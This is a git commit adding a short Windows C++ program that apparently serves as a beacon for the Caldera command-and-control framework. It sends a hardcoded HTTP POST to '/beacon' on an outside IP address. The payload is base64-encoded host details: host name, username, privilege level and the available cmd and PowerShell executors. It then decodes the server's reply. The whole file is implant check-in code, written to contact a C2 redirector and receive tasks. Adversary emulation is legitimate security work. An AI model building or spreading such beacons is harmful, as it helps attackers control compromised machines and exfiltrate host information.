f9e31090d0036386fef0a89d4d12ce45af0c9e6a
DillonSingh <100767876+DillonSingh@users.noreply.github.com>
2022-09-20 14:10:27 +0100

    Add files via upload

---
+++ HTTP2Caldera.cpp
@@ -0,0 +1,29 @@
+#include "internet.h"
+#include <windows.h>
+#include <WinInet.h>
+#include <stdio.h>
+#include <string>
+#include <iostream>
+#include "base64.h"
+#include "json.hpp"
+
+#pragma comment (lib, "wininet.lib")
+
+using namespace std;
+using namespace json;
+
+int main() {
+
+	// HTTP POST Request to redirector
+	HINTERNET hRequest = SendRequest("http://34.248.147.52:8888/", 80, "/beacon", "POST", "eyJwaWQiOiI5NjAiLCJzZXJ2ZXIiOiJsb2NhbGhvc3QiLCJwbGF0Zm9ybSI6IndpbmRvd3MiLCJob3N0IjoiREVTS1RPUC1UTjFRRE9VIiwidXNlcm5hbWUiOiJhbXJ0aCIsImFyY2hpdGVjdHVyZSI6ImFtZDY0IiwicHJpdmlsZWdlIjoiVXNlciIsICJleGVjdXRvcnMiOlsiY21kIiwgInBzaCJdfQ==");
+	cout << hRequest << "\n";
+	DWORD Length = 0; 
+	// Response from redirector 
+	char* Response = GetResponse(hRequest, &Length);
+	cout << Response << "  " << Length << "\n";
+    // Decoded Base64 Response
+	char* DecodedResponse = b64decode(Response, Length);
+	cout << DecodedResponse << "\n";
+
+		return 0;
+}
